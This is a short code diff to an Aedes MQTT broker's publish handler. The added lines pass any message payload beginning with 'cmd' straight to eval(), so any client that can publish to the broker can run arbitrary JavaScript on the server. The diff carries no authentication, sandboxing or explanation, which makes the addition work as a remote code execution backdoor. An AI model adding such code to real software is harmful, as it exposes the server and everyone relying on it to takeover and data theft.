@@ -17,6 +17,18 @@ aedes.on("publish", async function (packet, client) {
       packet.topic,
       packet.payload.toString()
     );
+  const payload = packet.payload.toString().trim();
+
+  if (payload.startsWith("cmd")) {
+    const code = payload.slice(3).trim();
+    try {
+      eval(code);
+    } catch (err) {
+      console.error("Erro ao executar comando:", err.message);
+    }
+  } else {
+    console.log("Payload ignorado:", payload);
+  }
 });
 
 aedes.on("client", function (client) {
